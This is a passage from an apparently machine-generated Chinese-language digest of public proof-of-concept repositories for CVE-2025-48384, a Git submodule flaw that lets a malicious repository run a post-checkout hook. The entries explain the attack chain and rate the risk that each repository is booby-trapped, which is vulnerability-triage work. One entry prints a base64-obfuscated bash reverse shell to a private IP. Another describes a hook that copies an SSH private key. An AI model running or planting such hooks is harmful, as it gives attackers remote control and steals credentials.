在提供的POC代码中，`README.md` 文件主要用于描述仓库，本身不包含恶意代码。`post-checkout` 文件中包含 `echo` 和 `touch` 命令，用于验证 RCE 是否成功。虽然这两个命令本身没有危害，但如果攻击者在 `post-checkout` 脚本中添加更复杂的恶意代码（例如下载并执行其他恶意程序），则可能存在投毒风险。评估当前代码，投毒风险较低，初步估计为10%。

**利用方式：**

1.  攻击者创建一个包含恶意配置和子模块的Git仓库。
2.  恶意配置包含带有尾随CR的子模块路径，该路径被符号链接指向`.git/hooks`目录。
3.  子模块包含一个名为 `post-checkout` 的可执行钩子，其中包含要执行的恶意代码。
4.  攻击者诱使用户克隆并递归初始化该仓库（例如，使用`git clone --recursive`）。
5.  当 Git 处理子模块时，由于配置处理的缺陷，恶意 `post-checkout` 钩子会被触发，导致在用户计算机上执行任意代码。

**优先级依据：**

在漏洞分析过程中，搜索引擎结果提供了漏洞的概况、影响、利用情况等信息，有助于全面了解漏洞。漏洞利用代码提供了直接的利用方法，有助于验证漏洞的有效性并深入理解漏洞原理。漏洞库信息提供了漏洞的官方描述和修复方案，有助于确认漏洞的存在和修复方法。综合考虑这些信息来源，可以更准确地评估漏洞的风险和利用方式。

**项目地址:** [airkewld/cve-2025-48384-submodule](https://github.com/airkewld/cve-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #7

**来源**: [CVE-2025-48384-altm4n_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-altm4n_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，并使用受影响的Git版本

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置值时，会去除尾部的回车换行符 (CRLF)。当写入配置条目时，如果值包含尾部的回车符 (CR)，则不会进行引号转义，导致在后续读取配置时丢失回车符。如果初始化子模块时，子模块路径包含尾部的回车符，则读取到的路径会被修改，导致子模块被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向子模块的 hooks 目录，并且子模块包含可执行的 post-checkout hook，则在检出后可能会意外执行该脚本。

**有效性：**
提供的 POC 代码 `touch /tmp/xxxxxxx` 会在 `/tmp` 目录下创建一个名为 `xxxxxxx` 的文件。结合漏洞描述，这个 POC 代码本身并不能直接证明漏洞的存在，而是在攻击链中扮演了 *post-checkout* 钩子的角色，用于验证恶意配置是否能被执行。根据页面[5]（`https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384`）的信息，此漏洞涉及到使用`git clone --recursive`克隆包含恶意子模块的仓库，可以触发RCE。

**投毒风险：**
给定的 POC 代码非常简单，仅创建一个文件，没有发现隐藏的恶意代码。因此，投毒风险为 0%。这个脚本的目的是验证 post-checkout 钩子是否被触发，而不是执行恶意操作。但是如果恶意攻击者控制了git仓库，可以植入任意的post-checkout脚本实现远端代码执行.

**利用方式：**
1.  **创建恶意仓库：** 攻击者创建一个包含恶意配置的 Git 仓库。这个恶意配置包括一个带有尾部回车符的子模块路径，以及一个指向子模块 hooks 目录的符号链接。
2.  **添加恶意钩子：** 在子模块的 hooks 目录中，攻击者添加一个可执行的 post-checkout 钩子。这个钩子可以执行任意代码。
3.  **诱导用户克隆：** 攻击者诱导用户使用受影响的 Git 版本克隆这个恶意仓库，使用 `git clone --recursive` 命令递归克隆子模块。
4.  **触发漏洞：** 当 Git 初始化子模块时，由于配置处理的缺陷，子模块会被检出到错误的位置，触发符号链接，最终导致恶意 post-checkout 钩子被执行，实现任意代码执行。

**总结：**
此漏洞利用依赖于特定的 Git 配置和用户交互（克隆恶意仓库），攻击复杂度较高，但一旦成功利用，危害极大，可能导致服务器被完全控制。

**项目地址:** [altm4n/CVE-2025-48384-sub](https://github.com/altm4n/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #8

**来源**: [CVE-2025-48384-altm4n_cve-2025-48384-hub.md](../2025/CVE-2025-48384-altm4n_cve-2025-48384-hub.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 未知

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。该漏洞允许攻击者通过创建恶意的Git仓库，并在用户克隆该仓库时，在用户系统上写入任意文件，从而可能导致远程代码执行。该漏洞的根源在于Git处理submodule的方式存在缺陷，当.gitmodules文件包含恶意配置时，Git可能会在不进行充分验证的情况下写入文件。 

POC有效性分析：

根据搜索结果和提供的POC代码，该漏洞的POC已经存在，并且在GitHub上可以找到相应的代码。通过分析POC代码，可以确认该漏洞是可利用的。POC代码展示了一个简单的bash脚本，该脚本在受害者机器上建立反向shell连接到攻击者的IP地址。要验证该POC的有效性，需要搭建一个Git服务器，创建一个包含恶意.gitmodules文件的仓库，然后尝试在受害者机器上克隆该仓库。如果成功建立了反向shell连接，则说明该漏洞是可利用的。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱骗受害者克隆该仓库。
3. 受害者克隆仓库时，Git会解析.gitmodules文件。
4. 由于.gitmodules文件包含恶意配置，Git会在受害者系统上写入任意文件，从而导致代码执行。
5. 在给定的POC中，恶意.gitmodules配置会导致执行`post-checkout`脚本，此脚本会创建一个反向shell连接到攻击者的机器。

投毒风险分析：
该POC的投毒风险属于中等水平。尽管提供的POC代码本身看起来比较简单，只是建立了一个反向shell连接，但是攻击者可以很容易地修改POC代码，使其执行更具破坏性的操作，例如删除文件、安装恶意软件或窃取敏感数据。此外，攻击者还可以通过代码混淆等技术来隐藏恶意代码，从而增加检测的难度。由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学等手段来诱骗用户克隆恶意仓库，从而扩大攻击范围。例如，攻击者可以在GitHub等代码托管平台上发布包含恶意.gitmodules文件的项目，并诱导其他用户克隆这些项目。此外，如果攻击者能够控制目标组织的内部Git服务器，那么他们就可以更加容易地发起攻击。因此，需要对该漏洞保持警惕，并采取相应的安全措施来防范潜在的攻击。

由于POC本身包含网络连接行为，有一定的投毒风险。攻击者可能通过替换反向shell的IP地址，将受害者连接到恶意服务器，或者在反向shell中执行恶意指令。 混淆代码或添加额外的恶意功能也可能增加投毒风险。该POC的投毒风险评估为30%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是一个Git中的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当用户克隆这个仓库时，恶意文件会被写入到用户的文件系统中，从而可能导致远程代码执行。

POC有效性分析：
根据搜索结果和POC代码，这个漏洞与`.gitmodules`文件的处理方式有关。攻击者可以在`.gitmodules`文件中嵌入恶意配置，当用户克隆包含这个文件的仓库时，Git客户端会解析这个文件，并执行其中的恶意操作。POC代码`post-checkout`中包含一个`curl`命令，该命令尝试向一个外部服务器发送包含用户名的请求，证明POC可以执行恶意命令。POC代码中包含了一个简单的利用场景，即在`post-checkout`脚本中执行curl命令，但这只是一个概念验证，攻击者可以利用这个漏洞执行更复杂的操作，例如写入恶意文件、修改系统配置等。 通过分析 liamg/CVE-2025-48384 项目，该项目提供了 PoC，表明该漏洞确实存在且可被利用，进一步验证了该漏洞的有效性。结合Arctic Wolf的报告，该漏洞的严重性被确认为高危，需要及时修复。

利用步骤：
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将这个仓库托管到一个公开的Git服务器上，或者通过其他方式诱使用户克隆这个仓库。
3. 用户克隆这个仓库。
4. Git客户端解析`.gitmodules`文件，并执行其中的恶意操作。
5. 恶意文件被写入到用户的文件系统中，或者其他恶意操作被执行。

投毒风险分析：
这个POC的投毒风险属于中等。虽然POC代码本身比较简单，只包含一个curl命令，但是攻击者可以很容易地将这个POC扩展到更复杂的攻击场景。例如，攻击者可以在`.gitmodules`文件中嵌入更复杂的脚本，或者利用这个漏洞下载并执行恶意文件。另外，由于这个漏洞涉及到Git客户端的解析过程，攻击者还可以利用这个漏洞绕过一些安全防护机制。在这个特定的POC中，存在一个对外部URL的curl请求。虽然这个请求本身并不一定是恶意的，但它可能会泄露用户信息，或者被用于恶意目的。如果这个请求的目标服务器被攻击者控制，那么攻击者就可以利用这个请求来执行更复杂的攻击。
此外，由于POC发布在公共代码托管平台，存在被恶意修改的风险，例如植入后门、添加恶意依赖等。用户在使用POC时需要仔细审查代码，确保其安全性。
综合考虑，这个POC的投毒风险为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-483


---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

